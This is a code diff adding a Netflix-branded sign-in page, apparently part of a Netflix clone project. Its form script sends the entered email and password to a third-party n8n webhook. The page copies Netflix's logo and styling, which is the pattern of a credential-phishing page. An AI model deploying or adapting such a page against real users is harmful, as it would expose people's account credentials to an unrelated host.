@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix Login</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600&display=swap">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Open Sans', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)), url('https://assets.nflxext.com/ffe/siteui/vlv3/757ab38f-5d08-40bc-b3eb-eaba63ed8203/93c34f94-56c8-40a7-8b2e-b4aac6427977/GB-en-20210125-popsignuptwoweeks-perspective_alpha_website_medium.jpg');
+            background-size: cover;
+            background-position: center;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+        }
+        
+        .logo {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            width: 167px;
+            height: 45px;
+        }
+        
+        .logo img {
+            width: 100%;
+            height: 100%;
+        }
+        
+        .login-container {
+            background-color: rgba(0, 0, 0, 0.8);
+            padding: 60px 68px 40px;
+            border-radius: 8px;
+            width: 100%;
+            max-width: 450px;
+            min-width: 300px;
+            margin-top: 30px;
+        }
+        
+        .login-container h2 {
+            margin-bottom: 28px;
+            font-size: 32px;
+            font-weight: 600;
+        }
+        
+        #loginForm {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+        
+        .input-group {
+            position: relative;
+        }
+        
+        #loginForm input {
+            padding: 16px 20px;
+            border-radius: 4px;
+            border: none;
+            background-color: #333;
+            color: #fff;
+            font-size: 16px;
+            outline: none;
+            width: 100%;
+        }
+        
+        #loginForm input:focus {
+            background-color: #454545;
+        }
+        
+        #loginForm input::placeholder {
+            color: #8c8c8c;
+        }
+        
+        .toggle-password {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #8c8c8c;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        
+        .toggle-password:hover {
+            color: #fff;
+        }
+        
+        #loginForm button[type="submit"] {
+            padding: 16px;
+            border-radius: 4px;
+            border: none;
+            background-color: #e50914;
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 24px;
+            transition: background-color 0.2s;
+        }
+        
+        #loginForm button[type="submit"]:hover {
+            background-color: #f6121d;
+        }
+        
+        .options {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 10px;
+            font-size: 13px;
+            color: #b3b3b3;
+        }
+        
+        .remember-me {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .remember-me input {
+            accent-color: #737373;
+        }
+        
+        .need-help {
+            color: #b3b3b3;
+            text-decoration: none;
+        }
+        
+        .need-help:hover {
+            text-decoration: underline;
+        }
+        
+        #responseMessage {
+            margin-top: 16px;
+            font-size: 14px;
+            text-align: center;
+        }
+        
+        .signup-link {
+            color: #737373;
+            margin-top: 16px;
+            text-align: center;
+            font-size: 16px;
+        }
+        
+        .signup-link a {
+            color: #fff;
+            text-decoration: none;
+        }
+        
+        .signup-link a:hover {
+            text-decoration: underline;
+        }
+        
+        .recaptcha {
+            margin-top: 13px;
+            font-size: 13px;
+            color: #8c8c8c;
+        }
+        
+        .recaptcha a {
+            color: #0071eb;
+            text-decoration: none;
+        }
+        
+        .recaptcha a:hover {
+            text-decoration: underline;
+        }
+        
+        @media (max-width: 500px) {
+            .logo {
+                left: 50%;
+                transform: translateX(-50%);
+            }
+            
+            .login-container {
+                padding: 40px 20px;
+                margin: 80px 20px 0;
+            }
+            
+            .login-container h2 {
+                font-size: 26px;
+                margin-bottom: 20px;
+            }
+            
+            .options {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix Logo">
+    </div>
+    
+    <div class="login-container">
+        <h2>Sign In</h2>
+        <form id="loginForm">
+            <input type="email" id="email" name="email" placeholder="Email" required>
+            
+            <div class="input-group">
+                <input type="password" id="password" name="password" placeholder="Password" required>
+                <button type="button" class="toggle-password" aria-label="Show password">
+                    <i class="fas fa-eye"></i>
+                </button>
+            </div>
+            
+            <button type="submit">Sign In</button>
+            
+            <div class="options">
+                <label class="remember-me">
+                    <input type="checkbox" name="remember" checked>Remember me
+                </label>
+                <a href="#" class="need-help">Need help?</a>
+            </div>
+        </form>
+        
+        <p id="responseMessage"></p>
+        
+        <div class="signup-link">
+            New to Netflix? <a href="register.html">Sign up now</a>.
+        </div>
+        
+        <div class="recaptcha">
+            This page is protected by Google reCAPTCHA to ensure you're not a bot. 
+            <a href="#">Learn more.</a>
+        </div>
+    </div>
+
+    <script>
+        document.querySelectorAll('.toggle-password').forEach(button => {
+    button.addEventListener('click', function() {
+        const input = this.previousElementSibling; // Selects the input field
+        const icon = this.querySelector('i');
+
+        if (input.type === 'password') {
+            input.type = 'text';
+            icon.classList.replace('fa-eye', 'fa-eye-slash');
+            this.setAttribute('aria-label', 'Hide password');
+        } else {
+            input.type = 'password';
+            icon.classList.replace('fa-eye-slash', 'fa-eye');
+            this.setAttribute('aria-label', 'Show password');
+        }
+    });
+});
+
+      document.getElementById("loginForm").addEventListener("submit", async function(event) {
+    event.preventDefault();
+
+    const email = document.getElementById("email").value;
+    const password = document.getElementById("password").value;
+    const responseMessage = document.getElementById("responseMessage");
+
+    const requestData = { email, password };
+
+    try {
+        const response = await fetch("https://hichy999.app.n8n.cloud/webhook/NetflixLogin", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(requestData)
+        });
+
+        const data = await response.json();
+        console.log(data); // Debugging: See what backend returns
+
+        if (data.success) {
+            // ✅ Save user session in localStorage
+            localStorage.setItem("user", JSON.stringify(data.user));
+            window.location.href = "home.html"; // Redirect to Home
+        } else {
+            responseMessage.innerText = "Invalid email or password!";
+            responseMessage.style.color = "red";
+        }
+    } catch (error) {
+        console.error("Error:", error);
+        responseMessage.innerText = "Error: Could not connect to server.";
+        responseMessage.style.color = "red";
+    }
+});
+
+    </script>
+</body>
+</html>
